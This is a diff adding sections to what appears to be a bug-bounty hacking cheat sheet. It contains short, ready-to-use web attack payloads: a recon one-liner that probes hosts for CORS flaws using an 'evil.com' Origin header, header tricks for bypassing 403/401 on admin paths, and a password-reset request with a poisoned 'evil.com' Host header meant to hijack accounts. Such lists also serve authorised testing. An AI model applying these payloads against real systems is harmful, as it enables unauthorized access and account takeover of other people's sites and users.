@@ -321,6 +321,45 @@ $ ffuf -mc 200 w jsurls.txt:HFUZZ -u HFUZZ -replay-proxy http://127.0.0.1:8080
 $ amass enum -d redacted.com | httpx -threads 300 -follow-redirects -silent | rush -j200 'curl -m5 -s -I -H "Origin: evil.com" {} | [[ $(grep -c "evil.com") -gt 0 ]] && printf "\n3[0;32m[VUL TO CORS] 3[0m{}"' 2>/dev/null
 ```
 
+
+---
+
+
+# Bypass 403 and 401
+
+```
+X-Original-URL: /admin
+X-Override-URL: /admin
+X-Rewrite-URL: /admin
+```
+
+
+---
+
+
+# Password poisoning bypass to account takeover
+
+```
+// Request
+POST https://target.com/password-reset?user=123 HTTP/1.1
+Host: evil.com
+
+// If you receive a link this works!
+```
+
+
+---
+
+
+# Best Wordlists
+
+```
+https://github.com/six2dez/OneListForAll/releases
+```
+
+
+---
+
 ### Thanks Follow me on Twitter
 
 [@0xJin](https://twitter.com/0xJin) - This tool is made from 0xJin
